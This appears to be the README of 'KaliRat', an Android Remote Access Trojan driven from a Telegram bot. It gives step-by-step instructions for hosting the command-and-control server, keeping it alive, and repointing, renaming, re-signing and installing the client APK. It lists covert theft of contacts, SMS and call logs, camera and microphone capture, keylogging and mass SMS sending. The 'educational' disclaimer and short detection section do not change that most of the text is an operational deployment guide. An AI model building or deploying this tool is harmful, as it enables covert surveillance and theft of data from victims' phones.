# KaliRat Bot

> **Educational Android Remote Access Tool for Security Research**

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

This project is provided strictly for:
- Security researchers studying mobile malware
- Penetration testers with written authorization
- Students learning about cybersecurity threats
- Malware analysts understanding RAT architectures

**Unauthorized use is illegal.** The authors are not responsible for any misuse.

---

## Overview

KaliRat is a Remote Access Trojan (RAT) that demonstrates how attackers can control Android devices remotely. It uses a client-server architecture with Telegram as the command interface.

### Architecture

```
┌──────────────┐     Telegram API     ┌──────────────────┐
│   Attacker   │ ◄──────────────────► │  Node.js Server  │
│  (Telegram)  │                      │    (main.js)     │
└──────────────┘                      └────────┬─────────┘
                                               │
                                        Socket.IO
                                               │
                                      ┌────────▼─────────┐
                                      │  Android Devices │
                                      │   (CLIENT.apk)   │
                                      └──────────────────┘
```

---

## Features

| Category | Features |
|----------|----------|
| **Data Extraction** | Contacts, SMS, Call Logs, Installed Apps, Clipboard |
| **Surveillance** | Front/Rear Camera, Microphone Recording, Keylogger |
| **Device Control** | Toast Messages, Vibration, Notifications |
| **SMS Abuse** | Send SMS, Broadcast to All Contacts |

---

## Project Structure

```
KaliRat_Bot/
├── main.js           # C2 Server (Command & Control)
├── package.json      # Node.js dependencies
├── .env.example      # Environment variables template
├── .env              # Your configuration (create this)
├── setup.sh          # Interactive setup script
├── CLIENT_src.apk    # Android client payload
├── SECURITY.md       # Security policy
├── LICENSE           # MIT License
└── README.md         # This file
```

---

## Configuration

This project uses **environment variables** (`.env` file) for configuration.

### Quick Setup (Recommended)

Run the interactive setup script:

```bash
# Run setup wizard
npm run setup
# or
bash setup.sh
```

The script will:
1. Check Node.js and npm
2. Install dependencies
3. Create `.env` from template
4. Prompt for your credentials
5. Verify configuration

### Manual Setup

#### Step 1: Create `.env` file

```bash
# Copy the template
cp .env.example .env

# Edit with your values
nano .env
```

#### Step 2: Configure environment variables

```bash
# ===========================================
# REQUIRED
# ===========================================

# Telegram Bot Token (from @BotFather)
BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz

# Your Telegram Chat ID (from @userinfobot)
ADMIN_CHAT_ID=1234567890

# ===========================================
# OPTIONAL
# ===========================================

# Server port (default: 3000)
PORT=3000

# Public URL for keep-alive pings
HOST_URL=https://your-app.onrender.com/

# SMS broadcast message
BROADCAST_TEXT=
```

| Variable | Required | Description | How to Get |
|----------|----------|-------------|------------|
| `BOT_TOKEN` | Yes | Telegram Bot API Token | [@BotFather](https://t.me/BotFather) → /newbot |
| `ADMIN_CHAT_ID` | Yes | Your Telegram Chat ID | [@userinfobot](https://t.me/userinfobot) |
| `PORT` | No | Server listening port | Default: 3000 |
| `HOST_URL` | No | Server URL for pings | Your deployment URL |
| `BROADCAST_TEXT` | No | SMS broadcast message | Optional |

#### Step 3: Get Telegram Credentials

**Bot Token:**
1. Open Telegram → Search `@BotFather`
2. Send `/newbot`
3. Follow prompts to name your bot
4. Copy the token (format: `123456789:ABCdefGHI...`)

**Chat ID:**
1. Open Telegram → Search `@userinfobot`
2. Send any message
3. Copy the ID number it returns

---

## Installation

### Requirements

- Node.js v16+
- npm
- Internet connection

### Setup

```bash
# Clone or download the project
cd KaliRat_Bot

# Option 1: Interactive setup (recommended)
npm run setup

# Option 2: Manual setup
npm install
cp .env.example .env
nano .env  # Add your credentials

# Start the server
npm start
```

### Expected Output

```
  _  __     _ _ ____       _
 | |/ /__ _| (_)  _ \ __ _| |_
 | ' // _` | | | |_) / _` | __|
 | . \ (_| | | |  _ < (_| | |_
 |_|\_\__,_|_|_|_| \_\__,_|\__|

      By MithunGowda.B and ManvanthGowda
listening on port 3000
```

---

## Deployment Options

### Option 1: Render.com (Recommended - Free)

Render.com offers free hosting with automatic deployments.

#### Quick Deploy (One-Click)

[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)

#### Manual Deploy

**Step 1: Push to GitHub**
```bash
# Make sure your code is on GitHub
git push origin main
```

**Step 2: Create Render Account**
1. Go to [render.com](https://render.com)
2. Sign up with GitHub

**Step 3: Create Web Service**
1. Click **New** → **Web Service**
2. Connect your GitHub repository
3. Configure settings:

| Setting | Value |
|---------|-------|
| **Name** | `kalirat-bot` |
| **Region** | Oregon (US West) |
| **Branch** | `main` |
| **Runtime** | Node |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |
| **Plan** | Free |

**Step 4: Set Environment Variables**

In Render Dashboard → Environment → Add the following:

| Key | Value | Required |
|-----|-------|----------|
| `BOT_TOKEN` | Your Telegram bot token | Yes |
| `ADMIN_CHAT_ID` | Your Telegram chat ID | Yes |
| `HOST_URL` | `https://your-app.onrender.com/` | Yes (for keep-alive) |
| `PORT` | `3000` | No (auto-set) |
| `KEEP_ALIVE_INTERVAL` | `840000` | No (default 14min) |

**Step 5: Deploy**
1. Click **Create Web Service**
2. Wait for deployment (2-3 minutes)
3. Copy your URL: `https://your-app.onrender.com`
4. Update `HOST_URL` environment variable with this URL

#### Keep-Alive (Prevent Sleep)

Render free tier sleeps after 15 minutes of inactivity. This project includes built-in keep-alive:

- **Self-ping** every 14 minutes (configurable via `KEEP_ALIVE_INTERVAL`)
- **Health endpoint** at `/health` for monitoring
- **Ping endpoint** at `/ping` for external monitors

**External Keep-Alive Options:**

1. **UptimeRobot** (Free) - [uptimerobot.com](https://uptimerobot.com)
   - Add HTTP monitor for `https://your-app.onrender.com/health`
   - Set interval to 5 minutes

2. **Cron-job.org** (Free) - [cron-job.org](https://cron-job.org)
   - Create job to ping `https://your-app.onrender.com/ping`
   - Set schedule: `*/14 * * * *` (every 14 minutes)

3. **GitHub Actions** (Free) - Add to `.github/workflows/keepalive.yml`:
   ```yaml
   name: Keep Alive
   on:
     schedule:
       - cron: '*/14 * * * *'
   jobs:
     ping:
       runs-on: ubuntu-latest
       steps:
         - run: curl https://your-app.onrender.com/ping
   ```

#### Verify Deployment

```bash
# Check health
curl https://your-app.onrender.com/health

# Expected response:
# {"status":"ok","uptime":123.45,"timestamp":"...","connections":0}
```

---

### Option 2: Local Network (Testing)

```bash
# Start server
node main.js

# Server runs on http://localhost:3000
# Use ngrok for public URL:
ngrok http 3000
```

---

### Option 3: VPS (DigitalOcean, AWS, etc.)

```bash
# Install Node.js on VPS
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Clone and run
git clone <repo>
cd KaliRat_Bot
npm install
node main.js
```

---

## Android Client Setup (APK Configuration)

The `CLIENT_src.apk` must be configured with your server URL before use. This section covers the complete process.

### Overview

```
CLIENT_src.apk
     │
     ▼ Decompile (apktool)
     │
┌────┴────┐
│  smali/ │  ← Dalvik bytecode
│  res/   │  ← Resources
│  assets/│  ← Config files
│  AndroidManifest.xml
└────┬────┘
     │
     ▼ Edit server URL
     │
     ▼ Recompile (apktool)
     │
     ▼ Sign (apksigner/jarsigner)
     │
     ▼ Ready to deploy
```

---

### Required Tools

#### Option A: Termux (Android)

```bash
# Update packages
pkg update && pkg upgrade

# Install Java
pkg install openjdk-17

# Install apktool
pkg install apktool

# Install apksigner (via android-tools)
pkg install android-tools

# Alternative: Install jadx for Java decompilation
pkg install jadx
```

#### Option B: Linux/Windows/Mac

| Tool | Purpose | Download |
|------|---------|----------|
| **Java JDK 11+** | Runtime | [adoptium.net](https://adoptium.net/) |
| **apktool** | Decompile/Recompile | [apktool.org](https://ibotpeaches.github.io/Apktool/) |
| **jadx** | Java decompiler (GUI) | [github.com/skylot/jadx](https://github.com/skylot/jadx) |
| **apksigner** | Sign APK | Included in Android SDK |
| **keytool** | Generate keystore | Included in Java JDK |

---

### Step 1: Decompile the APK

```bash
# Navigate to project directory
cd KaliRat_Bot

# Decompile APK
apktool d CLIENT_src.apk -o CLIENT_decompiled

# This creates:
# CLIENT_decompiled/
# ├── AndroidManifest.xml
# ├── apktool.yml
# ├── original/
# ├── res/
# ├── smali/
# └── assets/  (if exists)
```

---

### Step 2: Edit Server URL

The server URL is located in **`assets/connection.json`**:

```bash
# Open the connection config file
nano CLIENT_decompiled/assets/connection.json
```

**Current content:**
```json
{
  "host": "https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/"
}
```

**Change to your server URL:**
```json
{
  "host": "https://your-app.onrender.com/"
}
```

#### Examples:

| Deployment | URL Format |
|------------|------------|
| Render.com | `https://kalirat-bot.onrender.com/` |
| Heroku | `https://your-app.herokuapp.com/` |
| Railway | `https://your-app.up.railway.app/` |
| VPS | `https://your-domain.com/` or `http://YOUR_IP:3000/` |
| Ngrok | `https://xxxx-xx-xx-xx-xx.ngrok-free.app/` |

**Important:** Always include the trailing slash `/` at the end of the URL.

---

### Quick Edit Commands

```bash
# One-liner to replace URL (Termux/Linux)
sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-server.onrender.com/|g' CLIENT_decompiled/assets/connection.json

# Verify the change
cat CLIENT_decompiled/assets/connection.json
```

---

### Step 4: Edit AndroidManifest.xml (Optional)

You may want to modify app metadata:

```bash
nano CLIENT_decompiled/AndroidManifest.xml
```

**Common modifications:**

```xml
<!-- Change app name -->
<application android:label="Your App Name">

<!-- Change package name (requires renaming smali folders too) -->
<manifest package="com.yourcompany.appname">

<!-- Verify permissions are present -->
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_CALL_LOG"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.VIBRATE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
```

---

### Step 5: Recompile the APK

```bash
# Rebuild the APK
apktool b CLIENT_decompiled -o CLIENT_modified.apk

# Output: CLIENT_modified.apk (unsigned)
```

**Common build errors and fixes:**

| Error | Solution |
|-------|----------|
| `resource not found` | Check res/ folder integrity |
| `invalid instruction` | Verify smali syntax |
| `duplicate entry` | Remove duplicate files |

---

### Step 6: Generate Signing Key

APKs must be signed to install on Android:

```bash
# Generate a new keystore (one-time)
keytool -genkey -v -keystore my-release-key.jks \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -alias my-key-alias

# You'll be prompted for:
# - Keystore password
# - Key password
# - Name, Organization, etc.
```

**Keep your keystore safe!** You need the same key for updates.

---

### Step 7: Sign the APK

#### Method A: Using apksigner (recommended)

```bash
# Zipalign first (optional but recommended)
zipalign -v 4 CLIENT_modified.apk CLIENT_aligned.apk

# Sign the APK
apksigner sign --ks my-release-key.jks \
  --ks-key-alias my-key-alias \
  --out CLIENT_signed.apk \
  CLIENT_aligned.apk

# Verify signature
apksigner verify CLIENT_signed.apk
```

#### Method B: Using jarsigner (older method)

```bash
# Sign
jarsigner -verbose -sigalg SHA256withRSA \
  -digestalg SHA-256 \
  -keystore my-release-key.jks \
  CLIENT_modified.apk my-key-alias

# Verify
jarsigner -verify CLIENT_modified.apk
```

---

### Step 8: Install and Test

```bash
# Install via ADB
adb install CLIENT_signed.apk

# Or transfer to device and install manually
# (Enable "Unknown Sources" in settings)
```

---

### Quick Reference Commands

```bash
# ===========================================
# Complete APK Build Workflow (Termux/Linux)
# ===========================================

# 1. Decompile
apktool d CLIENT_src.apk -o CLIENT_decompiled

# 2. Edit server URL in assets/connection.json
nano CLIENT_decompiled/assets/connection.json
# Change: {"host": "https://your-app.onrender.com/"}

# Or use sed for quick replace:
sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-app.onrender.com/|g' CLIENT_decompiled/assets/connection.json

# 3. Verify the change
cat CLIENT_decompiled/assets/connection.json

# 4. Rebuild
apktool b CLIENT_decompiled -o CLIENT_modified.apk

# 5. Generate signing key (first time only)
keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key

# 6. Sign the APK
apksigner sign --ks release.jks --out CLIENT_final.apk CLIENT_modified.apk

# 7. Install
adb install CLIENT_final.apk
```

---

### APK Structure Reference

```
CLIENT_src.apk
├── AndroidManifest.xml      # App configuration & permissions
├── classes.dex              # Compiled Dalvik bytecode
├── res/                     # Resources (layouts, images, strings)
│   ├── drawable/            # Images
│   ├── layout/              # UI layouts
│   └── values/              # Strings, colors, styles
├── assets/                  # Raw files (configs, databases)
│   └── connection.json      # ⚡ SERVER URL CONFIG (EDIT THIS!)
├── lib/                     # Native libraries (.so files)
│   ├── armeabi-v7a/
│   ├── arm64-v8a/
│   └── x86/
├── META-INF/                # Signature files
│   ├── MANIFEST.MF
│   ├── CERT.SF
│   └── CERT.RSA
└── resources.arsc           # Compiled resources
```

---

### Troubleshooting

| Issue | Solution |
|-------|----------|
| APK won't install | Check signature, enable Unknown Sources |
| App crashes on start | Check logcat: `adb logcat \| grep -i crash` |
| Can't find URL | Use jadx-gui for better code view |
| Connection fails | Verify server is running, check URL |
| Permission denied | Verify all permissions in Manifest |
| Build fails | Clean and rebuild: `apktool empty-framework-dir` |

---

### Socket.IO Client in APK

The APK uses Socket.IO client to connect to server. Key code locations:

```
smali/io/socket/          # Socket.IO library
smali/com/.../            # Main app code
  ├── MainActivity        # Entry point
  ├── SocketService       # Background service
  ├── CommandHandler      # Processes server commands
  └── Utils               # Helper functions
```

**Connection flow:**
1. App starts → SocketService initialized
2. Service connects to server URL via Socket.IO
3. Sends device info (model, version, IP) in headers
4. Listens for "commend" events
5. Executes commands and sends responses

---

## Usage

### Telegram Commands

After starting the server, message your bot:

| Command | Action |
|---------|--------|
| `/start` | Show main menu |
| `Devices` | List connected devices |
| `Action` | Select device and action |
| `About us` | Show author info |

### Action Menu

After selecting a device:

| Action | Description |
|--------|-------------|
| Contacts | Extract all contacts |
| SMS | Read all messages |
| Calls | Get call history |
| Apps | List installed apps |
| Main camera | Take rear photo |
| Selfie Camera | Take front photo |
| Microphone | Record audio |
| Clipboard | Get clipboard |
| Toast | Show message on device |
| Vibrate | Vibrate device |
| Send SMS | Send SMS to number |
| Keylogger ON/OFF | Toggle keylogger |
| Pop notification | Show notification |
| Send SMS to all contacts | Broadcast SMS |

---

## Technical Details

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| express | ^4.18.2 | HTTP server |
| socket.io | ^4.5.3 | Real-time communication |
| node-telegram-bot-api | ^0.59.0 | Telegram integration |
| multer | ^1.4.5-lts.1 | File uploads |
| body-parser | ^1.20.1 | Request parsing |
| uuid | ^9.0.0 | Unique IDs |
| figlet | ^1.5.0 | ASCII banner |

### Communication Protocol

Server sends commands via Socket.IO:

```json
{
    "request": "command_type",
    "extras": [
        {"key": "param", "value": "value"}
    ]
}
```

### HTTP Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/upload` | POST | Receive files from devices |
| `/text` | GET | Return broadcast text |

---

## Security Research Notes

### Detection Indicators

**Network:**
- Socket.IO WebSocket to unknown host
- Telegram Bot API traffic
- File uploads to `/upload` endpoint

**Behavioral:**
- Excessive permissions on Android
- Background service persistence
- Camera/mic activation without UI

### Mitigation

1. Only install apps from Play Store
2. Review app permissions
3. Use mobile security software
4. Monitor network traffic

---

## Legal Notice

This tool demonstrates security vulnerabilities for educational purposes. Using it without authorization violates:

- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- GDPR (EU)
- Local cybercrime laws

**Only use in:**
- Authorized penetration tests
- Controlled lab environments
- Security research with consent

---

## Authors

- **MithunGowda.B** - [Instagram](https://instagram.com/mithun.gowda.b)
- **ManvanthGowda** - [Instagram](https://instagram.com/_.appu_kannadiga/)

---

## License

For educational purposes only. No warranty provided.
